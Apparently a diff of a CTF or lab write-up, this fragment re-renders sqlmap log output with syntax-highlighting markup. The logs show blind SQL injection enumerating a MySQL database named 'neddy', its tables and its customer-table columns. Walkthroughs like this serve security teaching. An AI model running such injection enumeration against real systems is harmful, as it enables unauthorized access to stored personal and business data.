 <p><br> There are 2 databases, <code class="highlighter-rouge">information_schema</code> and <code class="highlighter-rouge">neddy</code> :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[17:20:49] [INFO] the back-end DBMS is MySQL
-web application technology: Nginx 1.10.3
-back-end DBMS: MySQL &gt;= 5.0.12
-[17:20:49] [INFO] sqlmap will dump entries of all tables from all databases now
-[17:20:49] [INFO] fetching database names
-[17:20:49] [INFO] fetching number of databases
-[17:20:49] [INFO] resumed: 2
-[17:20:49] [INFO] retrieving the length of query output
-[17:20:49] [INFO] retrieved: 18
-[17:21:09] [INFO] retrieved: information_schema
-[17:21:09] [INFO] retrieving the length of query output
-[17:21:09] [INFO] retrieved: 5
-[17:21:21] [INFO] retrieved: neddy
-[17:21:21] [INFO] fetching tables for databases: 'information_schema, neddy'
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">49</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">the</span> <span class="n">back</span><span class="o">-</span><span class="k">end</span> <span class="n">DBMS</span> <span class="k">is</span> <span class="n">MySQL</span>
+<span class="n">web</span> <span class="n">application</span> <span class="n">technology</span><span class="p">:</span> <span class="n">Nginx</span> <span class="mi">1</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">3</span>
+<span class="n">back</span><span class="o">-</span><span class="k">end</span> <span class="n">DBMS</span><span class="p">:</span> <span class="n">MySQL</span> <span class="o">&gt;=</span> <span class="mi">5</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">12</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">49</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">sqlmap</span> <span class="n">will</span> <span class="n">dump</span> <span class="n">entries</span> <span class="k">of</span> <span class="k">all</span> <span class="n">tables</span> <span class="k">from</span> <span class="k">all</span> <span class="n">databases</span> <span class="n">now</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">49</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">fetching</span> <span class="k">database</span> <span class="k">names</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">49</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">fetching</span> <span class="n">number</span> <span class="k">of</span> <span class="n">databases</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">49</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="mi">2</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">49</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="k">length</span> <span class="k">of</span> <span class="n">query</span> <span class="k">output</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">49</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="mi">18</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">21</span><span class="p">:</span><span class="mi">09</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="n">information_schema</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">21</span><span class="p">:</span><span class="mi">09</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="k">length</span> <span class="k">of</span> <span class="n">query</span> <span class="k">output</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">21</span><span class="p">:</span><span class="mi">09</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="mi">5</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">21</span><span class="p">:</span><span class="mi">21</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="n">neddy</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">21</span><span class="p">:</span><span class="mi">21</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">fetching</span> <span class="n">tables</span> <span class="k">for</span> <span class="n">databases</span><span class="p">:</span> <span class="s1">'information_schema, neddy'</span>
 </code></pre></div></div>
 <p><br> We don’t need <code class="highlighter-rouge">information_schema</code> in anything and also dumping <code class="highlighter-rouge">neddy</code> with that kind of injection would take a lot of time, let’s take a look at the tables.</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[17:37:48] [INFO] fetching tables for database: 'neddy'
-[17:37:48] [INFO] fetching number of tables for database 'neddy'
-[17:37:48] [INFO] resumed: 11
-[17:37:48] [INFO] retrieving the length of query output
-[17:37:48] [INFO] resumed: 6
-[17:37:48] [INFO] resumed: config
-[17:37:48] [INFO] retrieving the length of query output
-[17:37:48] [INFO] resumed: 9
-[17:37:48] [INFO] resumed: customers
-[17:37:48] [INFO] retrieving the length of query output
-[17:37:48] [INFO] resumed: 9
-[17:37:48] [INFO] resumed: employees
-[17:37:48] [INFO] retrieving the length of query output
-[17:37:48] [INFO] resumed: 8
-[17:37:48] [INFO] resumed: filepath
-[17:37:48] [INFO] retrieving the length of query output
-[17:37:48] [INFO] resumed: 6
-[17:37:48] [INFO] resumed: idname
-[17:37:48] [INFO] retrieving the length of query output
-[17:37:48] [INFO] resumed: 7
-[17:37:48] [INFO] resumed: offices
-[17:37:48] [INFO] retrieving the length of query output
-[17:37:48] [INFO] resumed: 12
-[17:37:48] [INFO] resumed: orderdetails
-[17:37:48] [INFO] retrieving the length of query output
-[17:37:48] [INFO] resumed: 6
-[17:37:48] [INFO] resumed: orders
-[17:37:48] [INFO] retrieving the length of query output
-[17:37:48] [INFO] resumed: 8
-[17:37:48] [INFO] resumed: payments
-[17:37:48] [INFO] retrieving the length of query output
-[17:37:48] [INFO] resumed: 12
-[17:37:48] [INFO] resumed: productlines
-[17:37:48] [INFO] retrieving the length of query output
-[17:37:48] [INFO] resumed: 8
-[17:37:48] [INFO] resumed: products
-[17:37:48] [INFO] fetching columns for table 'customers' in database 'neddy'
-[17:37:48] [INFO] resumed: 13
-[17:37:48] [INFO] retrieving the length of query output
-[17:37:48] [INFO] resumed: 14
-[17:37:48] [INFO] resumed: customerNumber
-[17:37:48] [INFO] retrieving the length of query output
-[17:37:48] [INFO] resumed: 12
-[17:37:48] [INFO] resumed: customerName
-[17:37:48] [INFO] retrieving the length of query output
-[17:37:48] [INFO] resumed: 15
-[17:37:48] [INFO] resumed: contactLastName
-[17:37:48] [INFO] retrieving the length of query output
-[17:37:48] [INFO] resumed: 16
-[17:37:48] [INFO] resumed: contactFirstName
-[17:37:48] [INFO] retrieving the length of query output
-[17:37:48] [INFO] resumed: 5
-[17:37:48] [INFO] resumed: phone
-[17:37:48] [INFO] retrieving the length of query output
-[17:37:48] [INFO] resumed: 12
-[17:37:48] [INFO] resumed: addressLine1
-[17:37:48] [INFO] retrieving the length of query output
-[17:37:48] [INFO] resumed: 12
-[17:37:48] [INFO] resumed: addressLine2
-[17:37:48] [INFO] retrieving the length of query output
-[17:37:48] [INFO] resumed: 4
-[17:37:48] [INFO] resumed: city
-[17:37:48] [INFO] retrieving the length of query output
-[17:37:48] [INFO] resumed: 5
-[17:37:48] [INFO] resumed: state
-[17:37:48] [INFO] retrieving the length of query output
-[17:37:48] [INFO] resumed: 10
-[17:37:48] [INFO] resumed: postalCode
-[17:37:48] [INFO] retrieving the length of query output
-[17:37:48] [INFO] resumed: 7
-[17:37:48] [INFO] resumed: country
-[17:37:48] [INFO] retrieving the length of query output
-[17:37:48] [INFO] resumed: 22
-[17:37:48] [INFO] resumed: salesRepEmployeeNumber
-[17:37:48] [INFO] retrieving the length of query output
-[17:37:48] [INFO] resumed: 11
-[17:37:48] [INFO] resumed: creditLimit
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">fetching</span> <span class="n">tables</span> <span class="k">for</span> <span class="k">database</span><span class="p">:</span> <span class="s1">'neddy'</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">fetching</span> <span class="n">number</span> <span class="k">of</span> <span class="n">tables</span> <span class="k">for</span> <span class="k">database</span> <span class="s1">'neddy'</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="mi">11</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="k">length</span> <span class="k">of</span> <span class="n">query</span> <span class="k">output</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="mi">6</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="n">config</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="k">length</span> <span class="k">of</span> <span class="n">query</span> <span class="k">output</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="mi">9</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="n">customers</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="k">length</span> <span class="k">of</span> <span class="n">query</span> <span class="k">output</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="mi">9</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="n">employees</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="k">length</span> <span class="k">of</span> <span class="n">query</span> <span class="k">output</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="mi">8</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="n">filepath</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="k">length</span> <span class="k">of</span> <span class="n">query</span> <span class="k">output</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="mi">6</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="n">idname</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="k">length</span> <span class="k">of</span> <span class="n">query</span> <span class="k">output</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="mi">7</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="n">offices</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="k">length</span> <span class="k">of</span> <span class="n">query</span> <span class="k">output</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="mi">12</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="n">orderdetails</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="k">length</span> <span class="k">of</span> <span class="n">query</span> <span class="k">output</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="mi">6</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="n">orders</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="k">length</span> <span class="k">of</span> <span class="n">query</span> <span class="k">output</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="mi">8</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="n">payments</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="k">length</span> <span class="k">of</span> <span class="n">query</span> <span class="k">output</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="mi">12</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="n">productlines</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="k">length</span> <span class="k">of</span> <span class="n">query</span> <span class="k">output</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="mi">8</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="n">products</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">fetching</span> <span class="n">columns</span> <span class="k">for</span> <span class="k">table</span> <span class="s1">'customers'</span> <span class="k">in</span> <span class="k">database</span> <span class="s1">'neddy'</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="mi">13</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="k">length</span> <span class="k">of</span> <span class="n">query</span> <span class="k">output</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="mi">14</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="n">customerNumber</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="k">length</span> <span class="k">of</span> <span class="n">query</span> <span class="k">output</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="mi">12</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="n">customerName</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="k">length</span> <span class="k">of</span> <span class="n">query</span> <span class="k">output</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="mi">15</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="n">contactLastName</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="k">length</span> <span class="k">of</span> <span class="n">query</span> <span class="k">output</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="mi">16</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="n">contactFirstName</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="k">length</span> <span class="k">of</span> <span class="n">query</span> <span class="k">output</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="mi">5</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="n">phone</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="k">length</span> <span class="k">of</span> <span class="n">query</span> <span class="k">output</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="mi">12</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="n">addressLine1</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="k">length</span> <span class="k">of</span> <span class="n">query</span> <span class="k">output</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="mi">12</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="n">addressLine2</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="k">length</span> <span class="k">of</span> <span class="n">query</span> <span class="k">output</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="mi">4</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="n">city</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="k">length</span> <span class="k">of</span> <span class="n">query</span> <span class="k">output</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="mi">5</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="k">state</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="k">length</span> <span class="k">of</span> <span class="n">query</span> <span class="k">output</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="mi">10</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="n">postalCode</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="k">length</span> <span class="k">of</span> <span class="n">query</span> <span class="k">output</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="mi">7</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="n">country</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="k">length</span> <span class="k">of</span> <span class="n">query</span> <span class="k">output</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="mi">22</span>
+<span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resumed</span><span class="p">:</span> <span class="n">salesRepEmployeeNumber</span>
